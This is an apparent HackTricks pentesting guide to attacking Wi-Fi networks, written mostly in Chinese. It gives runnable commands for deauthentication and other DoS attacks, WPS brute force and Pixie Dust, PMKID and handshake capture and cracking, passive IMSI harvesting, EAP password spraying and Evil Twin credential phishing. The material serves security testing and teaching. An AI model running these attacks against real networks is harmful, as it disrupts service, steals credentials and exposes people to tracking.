# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi 基本命令
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## 工具

### Hijacker & NexMon (Android 内部 Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**使用 docker 运行 airgeddon**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
来源: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

它可以执行 Evil Twin、KARMA 和 Known Beacons 攻击，然后使用 phishing 模板，设法获取网络的真实密码或捕获社交网络凭证。
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

这个工具可以自动化执行 **WPS/WEP/WPA-PSK** 攻击。它会自动：

- 将接口设置为 monitor mode
- 扫描可能的网络 —— 并让你选择目标
- 如果是 WEP —— 启动 WEP 攻击
- 如果是 WPA-PSK
- 如果是 WPS：Pixie dust attack 和 bruteforce attack（注意 bruteforce attack 可能需要很长时间）。注意它不尝试 null PIN 或 database/generated PINs。
- 尝试从 AP 捕获 PMKID 以便破解
- 尝试对 AP 的客户端进行 deauthenticate 以捕获 handshake
- 如果有 PMKID 或 Handshake，就尝试用 top5000 密码进行 bruteforce。

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- 断开所有人（或特定的 ESSID/Client）
- Random fake APs -- 隐藏网络，可能导致扫描器崩溃
- Overload AP -- 尝试使 AP 停止工作（通常没多大用处）
- WIDS -- 干扰 IDS
- TKIP, EAPOL -- 针对某些 AP 的特定 DoS 攻击
- **Cracking**
- Crack **WEP**（使用多种工具和方法）
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin**（可带或不带 DoS）
- **Open** Evil Twin \[+ DoS] -- 有助于捕获 captive portal 凭证和/或 执行 LAN 攻击
- **WPA-PSK** Evil Twin -- 如果知道密码，对网络攻击很有用
- **WPA-MGT** -- 有助于捕获公司凭证
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- 有助于捕获 captive portal 凭证和/或 执行 LAN 攻击
- **+ WPA** -- 有助于捕获 WPA handshakes

## DOS

### Deauthentication Packets

**Description from** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** 攻击是 Wi‑Fi 攻击中常见的一种方法，涉及伪造“management”帧以 **强制断开设备与网络的连接**。这些未加密的数据包欺骗客户端，使其相信来自合法网络，从而让攻击者能够收集 WPA handshakes 以用于破解，或持续中断网络连接。这种策略以其简单性令人震惊，被广泛使用，对网络安全有重大影响。

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 表示 deauthentication
- 1 表示要发送的 deauths 数量（如果想可以发送多个）；0 表示持续发送
- -a 00:14:6C:7E:40:80 表示接入点（AP）的 MAC 地址
- -c 00:0F:B5:34:30:30 表示要 deauthenticate 的客户端的 MAC 地址；如果省略则发送 broadcast deauthentication（不总是有效）
- ath0 是接口名

### Disassociation Packets

**Disassociation packets**（类似于 deauthentication packets）是 Wi‑Fi 网络中使用的一类管理帧。  

这些数据包用于切断设备（例如笔记本或智能手机）与接入点（AP）之间的连接。disassociation 与 deauthentication 的主要区别在于使用场景。AP 会发出 **deauthentication packets 来将恶意设备明确移出网络，而 disassociation packets 通常在 AP 关机、重启或移动时发送，从而需要断开所有已连接节点的连接。**

**此攻击可通过 mdk4(mode "d") 执行：**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **更多由 mdk4 发起的 DOS 攻击**

**详见** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

向 clients 发送 beacon frames，在其处显示假 APs。 这有时会导致 network scanners 甚至 drivers 崩溃！
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

向范围内所有可访问的 Access Points (APs) 发送 authentication frames 可能会使这些 APs 过载，尤其是在涉及大量 clients 时。如此高强度的流量可能导致系统不稳定，使部分 APs 冻结甚至重置。
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

对 Access Points (APs) 的探测用于检查 SSID 是否被正确显示并确认 AP 的覆盖范围。该技术与 **bruteforcing hidden SSIDs**（有无 wordlist）相结合，有助于识别并访问隐藏的网络。

**ATTACK MODE m: Michael Countermeasures Exploitation**

向不同的 QoS 队列发送随机或重复的数据包可能会在 **TKIP APs** 上触发 Michael Countermeasures，导致 AP 关闭一分钟。该方法是一个高效的 **DoS** (Denial of Service) 攻击策略。
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

向 AP 大量发送 **EAPOL Start frames** 会创建 **fake sessions**，使 AP 不堪重负并阻止合法客户端。或者，注入 **fake EAPOL Logoff messages** 会强制断开客户端连接，这两种方法都能有效中断网络服务。
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: 针对 IEEE 802.11s 网状网络的攻击**

对网状网络中的链路管理和路由的各种攻击。

**ATTACK MODE w: WIDS 混淆**

将客户端交叉连接到多个 WDS 节点或伪造的 rogue AP，可以操纵 Intrusion Detection and Prevention Systems，造成混淆并可能导致系统被滥用。
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

一个具有多种数据包来源和用于数据包操作的完整修改器集的 packet fuzzer。

### **Airggedon**

_**Airgeddon**_ 提供了前面提到的大多数攻击：

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) 简化了设备连接到路由器的过程，提高了对使用 **WPA** 或 **WPA2** Personal 加密的网络的设置速度和便利性。它对容易被攻破的 **WEP** 安全性无效。WPS 使用一个 8 位数字的 PIN，分两部分校验，使其因组合数量有限（约 11,000 种可能）而容易受到 brute-force 攻击。

### WPS Bruteforce

执行此操作主要有两个工具：Reaver 和 Bully。

- **Reaver** 旨在成为针对 WPS 的稳健且实用的攻击工具，已在各种接入点和 WPS 实现上进行测试。
- **Bully** 是对 WPS 暴力破解攻击的 **新的实现**，用 C 编写。它相比原始 reaver 代码有若干优势：依赖更少、内存和 CPU 性能改进、正确处理大小端、以及更健壮的选项集。

该攻击利用了 **WPS PIN 的脆弱性**，尤其是其暴露了前四位数字以及最后一位作为校验位的作用，从而使 brute-force 攻击更为容易。然而，对抗 brute-force 攻击的防御措施（例如阻止攻击者的 **blocking MAC addresses**）会迫使攻击者通过 **MAC address rotation** 来继续发动攻击。

通过使用 Bully 或 Reaver 等工具获取 WPS PIN 后，攻击者可以推导出 WPA/WPA2 PSK，从而确保 **持久的网络访问**。
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

This refined approach targets WPS PINs using known vulnerabilities:

1. **预先发现的 PINs**: 使用一个已知 PINs 的数据库，该数据库将使用统一 WPS PINs 的特定厂商与其 PINs 关联。该数据库把 MAC-addresses 的前三个八位组与这些厂商可能使用的 PINs 对应起来。
2. **PIN 生成算法**: 利用像 ComputePIN 和 EasyBox 这样的算法，这些算法基于 AP 的 MAC-address 计算 WPS PINs。Arcadyan 算法额外需要 device ID，为 PIN 生成过程增加了一层复杂性。

### WPS Pixie Dust attack

**Dominique Bongard** 发现一些 Access Points (APs) 在生成称为 **nonces** (**E-S1** 和 **E-S2**) 的秘密码时存在缺陷。如果这些 nonces 能被推算出来，破解 AP 的 WPS PINs 就变得很容易。AP 在一个特殊的代码 (hash) 中泄露 PIN，以证明它是合法的而不是伪造的 (rogue AP)。这些 nonces 本质上是打开保存 WPS PINs 的“保险箱”的“钥匙”。更多信息见 [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

简单来说，问题在于一些 APs 在连接过程中用于加密 PIN 的密钥随机性不足。这使得 PIN 易于在网络外被猜测（offline brute force attack）。
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
如果你不想将设备切换到 monitor mode，或者 `reaver` 和 `bully` 出现问题，可以尝试 [OneShot-C](https://github.com/nikita-yfh/OneShot-C)。该工具可以在不切换到 monitor mode 的情况下执行 Pixie Dust attack。
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

一些设计不良的系统甚至允许一个 **Null PIN**（一个为空或不存在的 PIN）授予访问权限，这相当不寻常。工具 **Reaver** 能够检测此漏洞，而 **Bully** 则不行。
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

所有提出的 WPS 攻击都可以使用 _**airgeddon.**_ 轻松执行。

![](<../../images/image (219).png>)

- 5 和 6 让你尝试 **自定义 PIN**（如果有的话）
- 7 和 8 执行 **Pixie Dust attack**
- 13 允许你测试 **NULL PIN**
- 11 和 12 将 **从可用数据库中收集与所选 AP 相关的 PIN** 并 **生成** 可能的 **PIN**，使用：ComputePIN、EasyBox，及可选的 Arcadyan（推荐，为什么不呢？）
- 9 和 10 将测试 **所有可能的 PIN**

## **WEP**

现在已经很脆弱且几乎不用了。只需知道 _**airgeddon**_ 有一个名为 "All-in-One" 的 WEP 选项用于攻击这类保护。更多工具也提供类似选项。

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018 年，**hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) 提出了一种新的攻击方法，其独特之处在于它只需要 **一个数据包**，并且不需要任何客户端连接到目标 AP——只需要攻击者与 AP 之间的交互。

许多现代路由器在关联期间向 **第一个 EAPOL** 帧添加了一个 **可选字段**，称为 `Robust Security Network`。其中包含 `PMKID`。

正如原帖所解释，**PMKID** 是使用已知数据创建的：
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
鉴于“PMK Name”是恒定的，我们知道 AP 的 BSSID 和 station，且 `PMK` 与完整 4-way handshake 中的相同，**hashcat** 可以利用这些信息来破解 PSK 并恢复口令！

要**收集**这些信息并在本地**bruteforce**密码，你可以这样做：
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
这些 **PMKIDs captured** 将显示在 **console** 中，并且也会保存到 \_ **/tmp/attack.pcap**\_\
现在，将该捕获转换为 **hashcat/john** 格式并 crack 它：
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
请注意，正确的 hash 格式包含 **4 个部分**，例如：`4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`。如果你的 **仅** 包含 **3 个部分**，那么它是 **无效的**（PMKID 捕获无效）。

注意 `hcxdumptool` **也会捕获 handshakes**（会出现类似这样的内容：**`MP:M1M2 RC:63258 EAPOLTIME:17091`**）。你可以使用 `cap2hccapx` **转换** 这些 **handshakes** 为 **hashcat**/**john** 格式。
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_我注意到用这个工具捕获的一些 handshakes 即使知道正确的密码也无法被 cracked。我建议在可能的情况下也通过传统方式捕获 handshakes，或使用此工具捕获多个 handshakes。_

### Handshake 捕获

对 **WPA/WPA2** 网络的攻击可以通过捕获 **handshake** 并尝试在 **offline** 下 **crack** 密码来执行。这个过程涉及监听特定网络在特定 **channel** 上与 **BSSID** 的通信。下面是简明指南：

1. 识别目标网络的 **BSSID**、**channel** 和一个 **connected client**。
2. 使用 `airodump-ng` 在指定的 channel 和 BSSID 上监视网络流量，尝试捕获 handshake。命令如下：
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. 为了提高捕获 handshake 的机会，短暂断开 client 与 network 的连接以强制 re-authentication。可以使用 `aireplay-ng` 命令来完成，该命令向 client 发送 deauthentication packets：
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client was deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

一旦在 `airodump-ng` 中出现了 handshake 信息，表示已经捕获到 handshake，你可以停止监听：

![](<../../images/image (172) (1).png>)

一旦捕获到 handshake，你可以用 `aircrack-ng` **crack** 它：
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### 检查文件中是否包含 handshake

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_如果该工具在已完成的 handshake 之前先发现了某个 ESSID 的未完成 handshake，它就不会检测到有效的那个。_

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

在 **enterprise WiFi setups, you'll encounter various authentication methods** 中，每种都提供不同的安全级别和管理功能。当你使用像 `airodump-ng` 这样的工具检查网络流量时，你可能会看到这些认证类型的标识符。一些常见的方法包括：
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- 该方法在 EAP-PEAP 中支持硬件令牌和一次性密码。与 MSCHAPv2 不同，它不使用 peer challenge，并以明文将密码发送到 access point，从而存在 downgrade attacks 的风险。
2. **EAP-MD5 (Message Digest 5)**:
- 涉及从客户端发送密码的 MD5 哈希。由于容易受到字典攻击、缺乏 server authentication，并且无法生成会话特定的 WEP 密钥，因此**不推荐**使用。
3. **EAP-TLS (Transport Layer Security)**:
- 使用客户端和服务器端证书进行认证，并且可以动态生成基于用户和基于会话的 WEP 密钥以保护通信。
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- 通过加密隧道提供相互认证，并提供派生动态、每用户、每会话 WEP 密钥的方法。它只需要服务器端证书，客户端使用凭据。
5. **PEAP (Protected Extensible Authentication Protocol)**:
- 通过创建 TLS 隧道来实现受保护的通信，其工作方式与 EAP 类似。由于隧道提供的保护，它允许在 EAP 之上使用较弱的认证协议。
- **PEAP-MSCHAPv2**: 通常简称为 PEAP，它将易受攻击的 MSCHAPv2 challenge/response 机制与保护性的 TLS 隧道结合。
- **PEAP-EAP-TLS (or PEAP-TLS)**: 类似于 EAP-TLS，但在交换证书之前先建立 TLS 隧道，提供额外的安全层。

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

阅读 [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) 可知，如果你使用 **EAP**，则 **"Identity"** **messages** 必须被**支持**，并且 **username** 将在 **"Response Identity"** messages 中以**明文**发送。

即使使用最安全的认证方法之一：**PEAP-EAP-TLS**，也有可能**捕获在 EAP 协议中发送的用户名**。方法是**捕获一次认证通信**（在某个信道内启动 `airodump-ng`，并在同一接口上启动 `wireshark`）并按 `eapol` 筛选数据包。\
在“**Response, Identity**”数据包内，客户端的**用户名**将会出现。

![](<../../images/image (850).png>)

### Anonymous Identities

Identity 隐匿由 EAP-PEAP 和 EAP-TTLS 支持。在 WiFi 网络的上下文中，EAP-Identity 请求通常由 access point (AP) 在 association 过程中发起。为了确保用户匿名性的保护，用户设备上的 EAP 客户端在响应中仅包含初始 RADIUS 服务器处理请求所需的必要信息。以下场景说明了这一概念：

- EAP-Identity = anonymous
- 在这种情况下，所有用户都使用化名 "anonymous" 作为其用户标识。初始 RADIUS 服务器充当 EAP-PEAP 或 EAP-TTLS 服务器，负责管理 PEAP 或 TTLS 协议的服务器端。内层（受保护的）认证方法随后要么在本地处理，要么代理到远程（home）RADIUS 服务器。
- EAP-Identity = anonymous@realm_x
- 在这种情况下，来自不同 realm 的用户隐藏其真实身份，同时表明各自的 realm。这允许初始 RADIUS 服务器将 EAP-PEAP 或 EAP-TTLS 请求代理到其 home realm 中的 RADIUS 服务器，这些服务器充当 PEAP 或 TTLS 服务器。初始 RADIUS 服务器仅作为 RADIUS 中继节点运行。
- 或者，初始 RADIUS 服务器可以作为 EAP-PEAP 或 EAP-TTLS 服务器，并要么处理受保护的认证方法，要么将其转发给另一台服务器。此选项便于为不同的 realm 配置不同策略。

在 EAP-PEAP 中，一旦在 PEAP 服务器和 PEAP 客户端之间建立 TLS 隧道，PEAP 服务器会发起第二次 EAP-Identity 请求并通过 TLS 隧道传输。客户端通过加密隧道响应此第二次 EAP-Identity 请求，发送包含用户真实身份的 EAP-Identity 响应。此方法有效防止任何窃听 802.11 流量的人看到用户的真实身份。

EAP-TTLS 的流程稍有不同。使用 EAP-TTLS 时，客户端通常使用 PAP 或 CHAP 通过 TLS 隧道进行认证。在这种情况下，客户端在隧道建立后发送的初始 TLS 消息中包含 User-Name 属性以及 Password 或 CHAP-Password 属性。

无论选择哪种协议，PEAP/TTLS 服务器在 TLS 隧道建立后会获得用户的真实身份。真实身份可以表示为 user@realm 或仅为 user。如果 PEAP/TTLS 服务器也负责对用户进行认证，则它现在拥有用户的身份并继续进行由 TLS 隧道保护的认证方法。或者，PEAP/TTLS 服务器可以将一个新的 RADIUS 请求转发到用户的 home RADIUS 服务器。这个新的 RADIUS 请求省略了 PEAP 或 TTLS 协议层。如果受保护的认证方法是 EAP，则内层 EAP 消息在没有 EAP-PEAP 或 EAP-TTLS 包装的情况下传送到 home RADIUS 服务器。传出的 RADIUS 消息的 User-Name 属性包含用户的真实身份，取代传入 RADIUS 请求中的 anonymous User-Name。当受保护的认证方法是 PAP 或 CHAP（仅由 TTLS 支持）时，从 TLS 有效负载中提取的 User-Name 和其他认证属性会被替换到传出的 RADIUS 消息中，取代传入 RADIUS 请求中的 anonymous User-Name 和 TTLS EAP-Message 属性。

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

基于 SIM 的 Wi‑Fi 认证（使用 EAP‑SIM/EAP‑AKA over 802.1X）如果部署中未实现 pseudonyms/protected identities 或在内层 EAP 周围未使用 TLS 隧道，则在未认证的 identity 阶段可能以明文泄露永久订阅者标识符 (IMSI)。

发生 leak 的位置（高层）：
- 802.11 association 完成并连接到 SSID（通常是运营商 offload SSID，如 FreeWifi_secure、类似 eduroam 的 operator realms 等）。
- Authenticator 发送 EAP-Request/Identity。
- 易受影响的客户端在任何保护之前以其永久身份回答 EAP-Response/Identity，该永久身份为编码为 3GPP NAI 的 IMSI。
- 示例 NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- 任何被动监听 RF 的人都可以读取该帧。无需 4-way handshake 或 TLS keying。

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

注意：
- 如果部署使用裸 EAP‑SIM/AKA 并且没有使用受保护的身份/假名，则该方法在任何 TLS 隧道建立之前就有效。
- 暴露的值是与订户 SIM 绑定的永久标识符；采集后可用于长期跟踪和后续的电信滥用。

影响
- 隐私：在公共场所通过被动捕获 Wi‑Fi 数据实现对用户/设备的持续追踪。
- 电信滥用导火索：攻击者获得 IMSI 并有 SS7/Diameter 访问权限后，可查询位置或尝试拦截通话/SMS 以及窃取 MFA。

缓解措施 / 要检查的点
- 确认客户端按照 3GPP 指南（例如 3GPP TS 33.402）为 EAP‑SIM/AKA 使用匿名外部身份（假名）。
- 优先对身份阶段进行隧道化（例如通过 EAP‑TTLS/PEAP 携带内部 EAP‑SIM/AKA），以确保 IMSI 不以明文发送。
- 关联/认证的包捕获不应在 EAP-Response/Identity 中泄露原始 IMSI。

相关：使用捕获的移动标识符进行电信信令利用
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

如果客户端预期使用 **用户名和密码**（注意 **EAP-TLS 在这种情况下无效**），那么你可以尝试获取一个**用户名列表**（见下一部分）和**密码**，并尝试对访问进行**bruteforce**，使用 [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
你也可以使用 `eaphammer` 来执行此攻击：
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## 客户端攻击理论

### 网络选择与漫游

- 802.11 协议定义了客户端如何加入 Extended Service Set (ESS)，但并未指定选择 ESS 或其中某个接入点 (AP) 的标准。
- 客户端可以在共享相同 ESSID 的 AP 之间漫游，从而在建筑物或区域内保持连接。
- 该协议要求客户端对 ESS 进行认证，但不强制要求 AP 向客户端进行认证。

### 首选网络列表 (PNLs)

- 客户端在其首选网络列表 (PNL) 中存储每个已连接无线网络的 ESSID，以及与网络相关的配置细节。
- PNL 用于自动连接已知网络，通过简化连接过程来提升用户体验。

### 被动扫描

- AP 定期广播 beacon frames，宣告其存在和功能，包括 AP 的 ESSID（除非已禁用广播）。
- 在被动扫描期间，客户端监听 beacon frames。如果某个 beacon 的 ESSID 与客户端 PNL 中的条目匹配，客户端可能会自动连接到该 AP。
- 了解设备的 PNL 后，可以通过伪装成已知网络的 ESSID 来利用它，从而诱使设备连接到 rogue AP。

### 主动探测

- 主动探测涉及客户端发送 probe requests，以发现附近的 AP 及其特性。
- 定向的 probe requests 针对特定的 ESSID，有助于检测某个网络是否在范围内，即使它是隐藏网络。
- 广播式 probe requests 的 SSID 字段为空（null），发送给所有附近的 AP，使客户端在不泄露其 PNL 内容的情况下检查是否有任何首选网络。

## 简单 AP 并将流量重定向到互联网

在解释如何执行更复杂的攻击之前，将先说明 **如何** 仅 **创建** 一个 **AP** 并 **重定向** 它的 **流量** **到** 已连接至 **互联网** 的接口。

使用 `ifconfig -a` 检查用于创建 AP 的 wlan 接口和连接到互联网的接口是否存在。

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
创建配置文件 `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
然后 **set IPs** 和 **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
然后 **启动** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
创建配置文件 `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**停止干扰进程**，设置**monitor mode**，并**启动 hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### 转发与重定向
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack 利用 WiFi clients 识别网络的方式，主要依赖网络名称 (ESSID)，而不要求 base station (access point) 向客户端进行身份验证。关键点包括：

- **难以区分**：当合法和 rogue access points 共享相同的 ESSID 和加密类型时，设备很难区分它们。现实网络常常使用多个具有相同 ESSID 的 access points 来无缝扩展覆盖范围。
- **客户端漫游与连接操控**：802.11 协议允许设备在同一 ESS 内在 access points 之间漫游。攻击者可以利用这一点，通过诱使设备断开当前 base station 并连接到 rogue access point 来实现攻击。这可以通过提供更强的信号，或通过向合法 access point 发送 deauthentication packets 或进行 jamming 来破坏连接实现。
- **执行难点**：在存在多个合理部署的 access points 的环境中，成功实施 an evil twin attack 具有挑战性。Deauthenticating 单个合法 access point 通常会导致设备连接到另一个合法 access point，除非攻击者能够 deauthenticate 所有附近的 access points 或者策略性地放置 rogue access point。

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
你也可以使用 **eaphammer** 创建一个 Evil Twin（注意，要用 eaphammer 创建 evil twins 时，接口 **不应处于** **monitor** 模式）：
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
或者使用 Airgeddon：`Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

请注意，默认情况下，如果 PNL 中的 ESSID 被保存为 WPA 受保护，设备不会自动连接到开放的 Evil Twin。你可以尝试对真实 AP 进行 DoS，希望用户会手动连接到你的开放的 Evil Twin，或者你也可以对真实 AP 进行 DoS 并使用 WPA Evil Twin 来捕获握手（使用此方法你无法让受害者连接到你，因为你不知道 PSK，但你可以捕获握手并尝试破解）。

_一些 OS 和 AV 会警告用户，连接到开放网络是危险的..._

### WPA/WPA2 Evil Twin

你可以创建一个 **Evil Twin 使用 WPA/2**，如果设备被配置为使用 WPA/2 连接到该 SSID，它们会尝试连接。无论如何，**要完成 4-way-handshake**，你还需要**知道**客户端将使用的**密码**。如果你**不知道**它，**连接不会完成**。
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

要理解这种攻击，我建议先阅读简短的 [WPA Enterprise explanation](#wpa-enterprise-mgt)。

